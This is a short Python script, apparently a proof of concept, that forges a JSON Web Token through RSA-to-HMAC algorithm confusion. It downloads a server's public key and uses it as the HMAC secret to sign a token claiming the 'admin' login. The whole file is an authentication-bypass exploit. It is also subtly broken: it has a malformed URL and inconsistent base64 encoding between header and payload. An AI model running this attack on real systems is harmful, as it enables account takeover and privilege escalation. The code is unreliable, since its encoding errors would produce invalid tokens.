import requests
import base64
import hmac
import hashlib
#RSA to HMAC

#read header
header = '{"typ":"JWT","alg":"HS256"}'

#read payload
payload = '{"login":"admin"}'

#read public key from URL
pubkey ="http:/example.com/pub.pem"

base64header = base64.b64encode(header)
base64payload = base64.b64encode(payload).strip('=')

#get public key
res = requests.get(pubkey)

headerandpayload = base64header + '.' + base64payload

finaljwt = headerandpayload+'.'+base64.b64encode(hmac.new(res.content, msg=headerandpayload, digestmod=hashlib.sha256).digest()).replace('/','_').replace('+','-').strip('=')

print(finaljwt)

